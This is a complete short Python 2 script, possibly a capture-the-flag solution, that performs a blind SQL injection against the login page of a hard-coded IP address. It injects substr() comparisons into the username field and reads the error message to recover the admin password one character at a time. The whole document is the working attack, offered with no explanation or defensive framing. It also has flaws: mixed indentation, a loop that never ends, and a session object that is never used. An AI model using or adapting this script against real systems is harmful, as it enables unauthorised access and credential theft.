import requests
import json
 

password=""
 
data=""
sample="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
while True:
  for i in range(1,35):
	 for j in sample:
		session = requests.session()
		datas={"username":"admin' and substr(password,"+str(i)+",1)='"+j+"'-- -","signIn":"signIn"}
		url="http://128.199.236.78:1111/index.php"
		temp=requests.post(url,data=datas)
		if temp.content.find("is not exists!")<0:
				password=password+j
				print password
				break;
print password